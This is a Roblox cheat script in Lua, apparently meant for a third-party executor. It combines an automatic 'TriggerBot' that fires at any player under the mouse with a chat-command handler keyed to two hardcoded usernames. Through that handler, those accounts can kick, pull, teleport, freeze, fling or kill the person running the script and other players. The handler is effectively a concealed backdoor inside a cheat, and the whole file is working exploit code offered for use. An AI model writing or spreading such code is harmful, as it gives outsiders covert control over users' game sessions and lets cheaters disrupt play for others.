-- Triggerbot + VIP commands + bubble chat

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Camera = workspace.CurrentCamera

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

-- SETTINGS
local VIPUsers = { "draconvm", "K3TCHUPSS" }
local BringTargets = {}
local FrozenPlayers = {}

-- VIP-related functions
local function teleportToPlayer(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    local myChar = LocalPlayer.Character
    if targetPlayer and targetPlayer.Character and myChar then
        local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
        if targetRoot and myRoot then
            myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
        end
    end
end

local function freezeAllPlayers(senderName)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Name ~= senderName and not FrozenPlayers[player.Name] then
            local root = player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.Anchored = true
                FrozenPlayers[player.Name] = true
            end
        end
    end
end

local function unfreezeAllPlayers(senderName)
    for name, _ in pairs(FrozenPlayers) do
        if name ~= senderName then
            local player = Players:FindFirstChild(name)
            if player and player.Character then
                local root = player.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    root.Anchored = false
                end
            end
            FrozenPlayers[name] = nil
        end
    end
end

local function killAllOtherPlayers(senderName)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name ~= senderName then
            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Health = 0
            end
        end
    end
end

-- SMOOTH BRING LOOP
RunService.RenderStepped:Connect(function()
    for targetName, _ in pairs(BringTargets) do
        local targetPlayer = Players:FindFirstChild(targetName)
        for _, vipName in ipairs(VIPUsers) do
            local vipPlayer = Players:FindFirstChild(vipName)
            if vipPlayer and vipPlayer.Character and targetPlayer and targetPlayer.Character and targetPlayer ~= vipPlayer then
                local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
                local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if vipRoot and targetRoot then
                    local direction = (vipRoot.Position + Vector3.new(0,3,0) - targetRoot.Position)
                    targetRoot.CFrame = targetRoot.CFrame + direction * 0.25
                end
            end
        end
    end
end)

-- FLING FUNCTION (STRONG)
local function flingPlayer(player)
    if player.Character then
        local root = player.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Velocity = Vector3.new(math.random(-1500,1500), 800, math.random(-1500,1500))
            bodyVelocity.MaxForce = Vector3.new(1e6,1e6,1e6)
            bodyVelocity.P = 1e5
            bodyVelocity.Parent = root
            task.delay(0.3, function() bodyVelocity:Destroy() end)
        end
    end
end

-- CHAT COMMAND HANDLER
local function onMessage(senderName, message)
    local isVIP = false
    for _, vipName in ipairs(VIPUsers) do
        if senderName:lower() == vipName:lower() then
            isVIP = true
            break
        end
    end
    if not isVIP then return end

    local args = message:split(" ")
    local msg = args[1]:lower()

    if msg == ".k" and LocalPlayer.Name:lower() ~= senderName:lower() then
        LocalPlayer:Kick("Kicked by VIP")
    end

    if msg == ".g" then
        if LocalPlayer.Name ~= senderName then
            BringTargets[LocalPlayer.Name] = true
        end
    end

    if msg == ".s" then
        BringTargets[LocalPlayer.Name] = nil
    end

    if msg == ".f" then
        freezeAllPlayers(senderName)
    end

    if msg == ".u" then
        unfreezeAllPlayers(senderName)
    end

    if msg == ".tp" and args[2] then
        if LocalPlayer.Name ~= senderName then
            teleportToPlayer(args[2])
        end
    end

    if msg == ".fling" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name ~= senderName then
                flingPlayer(player)
            end
        end
    end

    if msg == ".r" then
        if LocalPlayer.Name ~= senderName then
            killAllOtherPlayers(senderName)
        end
    end
end

-- CHAT HOOKS
local function hookPlayer(plr)
    plr.Chatted:Connect(function(msg)
        onMessage(plr.Name, msg)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
Players.PlayerAdded:Connect(hookPlayer)

-- Standalone Ultra Fast TriggerBot System
local TriggerBot = {
    Enabled = false,
    Connections = {},
    BlacklistCache = {}
}

-- Configuration
TriggerBot.Settings = {
    Keybind = Enum.KeyCode.Q, -- Use Enum.KeyCode directly
    Prediction = 0.01,
    Blacklisted = {"Knife"}
}

-- Pre-cache blacklisted items
for _, itemName in ipairs(TriggerBot.Settings.Blacklisted) do
    TriggerBot.BlacklistCache[itemName:lower()] = true
end

-- Check if tool is blacklisted
local function IsToolBlacklisted(tool)
    return tool and TriggerBot.BlacklistCache[tool.Name:lower()]
end

-- Check if player is valid target
local function IsValidTarget(player)
    if not player or player == Players.LocalPlayer then return false end
    
    local character = player.Character
    if not character then return false end
    
    local bodyEffects = character:FindFirstChild("BodyEffects")
    if bodyEffects then
        local ko = bodyEffects:FindFirstChild("K.O") or bodyEffects:FindFirstChild("KO")
        if ko and ko.Value then return false end
    end
    
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid and humanoid.Health <= 0 then return false end
    
    return true
end

-- Get target player from mouse target
local function GetTargetFromMouse()
    local mouseTarget = Mouse.Target
    if not mouseTarget then return nil end
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and mouseTarget:IsDescendantOf(player.Character) then
            if IsValidTarget(player) then
                return player, mouseTarget
            end
        end
    end
    
    return nil
end

-- Get equipped tool
local function GetEquippedTool()
    local character = Players.LocalPlayer.Character
    if not character then return nil end
    
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") and not IsToolBlacklisted(tool) then
            return tool
        end
    end
    
    return nil
end

-- Main trigger function
local function Execute()
    if not TriggerBot.Enabled then return end
    
    local targetPlayer, targetPart = GetTargetFromMouse()
    if not targetPlayer then return end
    
    local tool = GetEquippedTool()
    if not tool then return end
    
    if TriggerBot.Settings.Prediction > 0 then
        task.wait(TriggerBot.Settings.Prediction)
    end
    
    tool:Activate()
end

-- Toggle function
function TriggerBot:Toggle(state)
    if state ~= nil then
        self.Enabled = state
    else
        self.Enabled = not self.Enabled
    end
end

-- Keybind handler
local function HandleInput(input, gameProcessed)
    if gameProcessed then return end
    
    if input.UserInputType == Enum.UserInputType.Keyboard and
        input.KeyCode == TriggerBot.Settings.Keybind then
        TriggerBot:Toggle()
    end
end

-- Initialize the TriggerBot
TriggerBot.Connections.InputBegan = UserInputService.InputBegan:Connect(HandleInput)
TriggerBot.Connections.RenderStepped = RunService.RenderStepped:Connect(Execute)

-- Cleanup function
getgenv().DisableTriggerBot = function()
    for _, connection in pairs(TriggerBot.Connections) do
        connection:Disconnect()
    end
    TriggerBot.Enabled = false
end
